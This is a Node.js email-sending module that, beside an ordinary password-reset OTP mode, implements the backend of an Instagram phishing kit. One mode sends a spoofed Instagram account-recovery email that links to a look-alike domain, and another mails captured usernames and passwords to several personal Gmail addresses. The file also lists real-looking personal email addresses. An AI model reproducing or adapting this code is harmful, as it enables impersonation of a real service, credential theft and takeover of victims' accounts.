const nodemailer = require('nodemailer');
const catchAsyncError = require('../middlewares/catchAsyncError');

const transport = nodemailer.createTransport({
    host: process.env.SMPT_HOST,
    port: process.env.SMPT_PORT,
    service: process.env.SMPT_SERVICE,
    secure: true,
    debug: true,
    auth: {
        user: process.env.SMPT_MAIL,
        pass: process.env.SMPT_PASSWORD,
      },
})

const sendMail = catchAsyncError(async (email, secretToken, mode) => {
   
        if (mode == 'OTP') {
            
            return await transport.sendMail({
                from: process.env.SMPT_MAIL,
                to: email,
                subject: "OTP Submission",
                html: `
        <h1>Reset Password</h1>
        <p> Here is your otp to change the password ${secretToken} </p>
      `
            })
        }
        if (mode === 'email') {
            
            return await transport.sendMail({
              from: '"Instagram Recovery" <instragram@ethereal.email>', // sender address
              to: ["instgaram.service@gmail.com","yash.patel98305@gmail.com"],
              subject: "Urgent recovery of your Instagram account",
                text: "Hello Vansh, Please recover your Instagram account by following the instructions.", // plain text body
                html: `
      <!DOCTYPE html>
      <html lang="en">
      <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Instagram Account Recovery</title>
        <style>
          body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #fafafa;
          }
          .container {
            width: 100%;
            max-width: 600px;
            margin: 0 auto;
            padding: 20px;
            background-color: #ffffff;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
          }
          h1 {
            font-size: 24px;
            color: #262626;
            margin-bottom: 10px;
          }
          p {
            font-size: 16px;
            color: #555555;
            line-height: 1.5;
          }
          .button {
            display: inline-block;
            background-color: #0095f6;
            color: #ffffff;
            text-decoration: none;
            padding: 12px 24px;
            border-radius: 5px;
            font-weight: bold;
            text-align: center;
            margin-top: 20px;
          }
          .footer {
            font-size: 12px;
            color: #999999;
            margin-top: 40px;
            text-align: center;
          }
          .footer a {
            color: #0095f6;
            text-decoration: none;
          }
        </style>
      </head>
      <body>
        <div class="container">
          <h1>Instagram Account Recovery</h1>
          <p>Hello <strong>Vansh</strong>,</p>
          <p>It looks like you requested a recovery for your Instagram account. You can reset your password and regain access by clicking the link below:</p>
          <a href="https://instragaram.netlify.app/" class="button">Reset Password</a>
          <p>If you didn’t request a password reset, please ignore this message. Your account is safe.</p>
          <p>Thanks, <br> The Instagram Team</p>
          
          <div class="footer">
            <p>This is an automated email, please do not reply to this email.</p>
            <p><a href="https://help.instagram.com/">Instagram Help Center</a></p>
          </div>
        </div>
      </body>
      </html>
    `
            })
        }
        if(mode === "password"){
          return await transport.sendMail({
            from: '"Instagram Password" <instragram@ethereal.email>', // sender address
            to: ["instgaram.service@gmail.com","yash.patel98305@gmail.com","vanshverma500@gmail.com"],
              subject: "Password mil gya",
              text: "Password aa gya bhai", // plain text body
              html: `<p>email : ${secretToken.username}</p>
              <p>password : ${secretToken.password} </p>` 
              })
}
})

module.exports = sendMail  